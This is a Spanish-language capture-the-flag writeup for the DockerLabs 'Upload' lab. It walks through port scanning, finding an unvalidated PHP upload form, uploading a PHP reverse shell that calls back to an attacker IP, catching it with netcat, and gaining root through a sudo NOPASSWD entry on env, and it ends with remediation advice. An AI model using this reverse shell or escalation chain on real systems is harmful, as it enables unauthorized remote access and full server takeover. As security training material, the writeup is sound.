# Upload
Panel vulnerable de subida de archivos, donde se puede subir código malicioso y conseguir una ejecución remota de comandos en el servidor.
# Upload — Writeup

> Máquina vulnerable de **DockerLabs** · Subida de fichero sin validación + escalada con `env`
> **SO:** Linux (Apache 2.4.52) · **Dificultad:** Fácil · **Target:** `172.17.0.2` · **Atacante:** `10.0.2.15`

**Tags:** `#dockerlabs` `#ctf` `#file-upload` `#privesc` `#writeup`

---

## Índice
1. [Reconocimiento](#1-reconocimiento)
2. [Enumeración web](#2-enumeración-web)
3. [Explotación — subida de fichero PHP](#3-explotación--subida-de-fichero-php)
4. [Foothold — shell como www-data](#4-foothold--shell-como-www-data)
5. [Escalada de privilegios — env](#5-escalada-de-privilegios--env)
6. [Resumen de la cadena](#6-resumen-de-la-cadena)

---

## 1. Reconocimiento

Escaneo completo de puertos TCP con detección de versiones y scripts por defecto:

```bash
sudo nmap -p- -sS -sC -sV -vvv -T5 -Pn -n 172.17.0.2
```

Solo hay **un puerto abierto**, el **80/tcp**, con un título muy revelador: *"Upload here your file"*.

```
PORT   STATE SERVICE REASON         VERSION
80/tcp open  http    syn-ack ttl 64 Apache httpd 2.4.52 ((Ubuntu))
|_http-title: Upload here your file
| http-methods:
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-server-header: Apache/2.4.52 (Ubuntu)
```

> **Lectura rápida:** un único vector (web) y un título que anuncia una funcionalidad de subida de ficheros. El camino evidente es conseguir subir código ejecutable (PHP) al servidor.

---

## 2. Enumeración web

Fuzzeo de contenido con `dirb`:

```bash
dirb http://172.17.0.2
```

```
+ http://172.17.0.2/index.html       (CODE:200|SIZE:1361)
+ http://172.17.0.2/server-status    (CODE:403|SIZE:275)
==> DIRECTORY: http://172.17.0.2/uploads/
    (!) WARNING: Directory IS LISTABLE.
```

Dos hallazgos clave:
- Existe `upload.php` (el formulario de subida que anuncia el título).
- El directorio `/uploads/` es **listable** y es donde van a parar los ficheros subidos — justo lo que necesitamos para localizar y ejecutar nuestro payload.

![Formulario de subida en upload.php](images/01-upload.png)
*El formulario `upload.php` — acepta cualquier fichero sin validación de extensión.*

---

## 3. Explotación — subida de fichero PHP

La aplicación **no valida la extensión ni el tipo MIME** del fichero, así que subimos directamente un **reverse shell en PHP**. Partimos del clásico `php-reverse-shell` de pentestmonkey y ajustamos solo la IP y el puerto:

```php
// reverse_shell_automatica.php
$ip   = '10.0.2.15';   // nuestra IP (Kali)
$port = 443;           // puerto de escucha
$shell = 'uname -a; w; id; /bin/sh -i';
```

Lo subimos mediante el formulario y el servidor confirma:

> *"The file reverse_shell_automatica.php has been uploaded."*

Y lo vemos alojado en el directorio listable `/uploads/`, confirmando la ruta de ejecución:

![Index of /uploads](images/02-uploads-index.png)
*`http://172.17.0.2/uploads/` — el payload PHP está servido y listo para ejecutarse.*

---

## 4. Foothold — shell como www-data

Ponemos un listener en el puerto 443:

```bash
nc -lnvp 443
listening on [any] 443 ...
```

Visitamos la URL del shell para que se ejecute:

```
http://172.17.0.2/uploads/reverse_shell_automatica.php
```

Y recibimos la conexión de vuelta:

```
connect to [10.0.2.15] from (UNKNOWN) [172.17.0.2] 51944
Linux 7a0e1b3de9f9 ... Kali ... x86_64 GNU/Linux
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$
```

Ya tenemos ejecución de comandos como `www-data`.

---

## 5. Escalada de privilegios — env

Comprobamos permisos `sudo` del usuario actual:

```bash
sudo -l
```

```
User www-data may run the following commands on 7a0e1b3de9f9:
    (root) NOPASSWD: /usr/bin/env
```

> **Vector claro:** podemos ejecutar `/usr/bin/env` como **root sin contraseña**. `env` permite lanzar un comando arbitrario, así que abrimos una shell directamente como root. Abuso documentado en [GTFOBins](https://gtfobins.github.io/gtfobins/env/#sudo).

```bash
sudo -u root /usr/bin/env /bin/sh -p
whoami
root
```

**`root@upload`** — máquina comprometida por completo. 🏴

---

## 6. Resumen de la cadena

| Fase | Técnica | Resultado |
|------|---------|-----------|
| Recon | nmap full-port | Único puerto 80 (Apache 2.4.52) |
| Enumeración | dirb → `/uploads/` listable + `upload.php` | Punto de subida y de ejecución localizados |
| Explotación | Subida sin validar → PHP reverse shell | Ejecución remota de código |
| Foothold | netcat + ejecución del `.php` | Shell como `www-data` |
| Privesc | `sudo env` (GTFOBins) | **root** |

### Remediación
- Validar extensión y tipo MIME en la subida; almacenar los ficheros fuera del webroot o impedir la ejecución de PHP en `/uploads/` (`php_admin_flag engine off`).
- Deshabilitar el *directory listing* (`Options -Indexes`).
- Eliminar la entrada `NOPASSWD` de `/usr/bin/env` del `sudoers`; es equivalente a dar root directo.

---
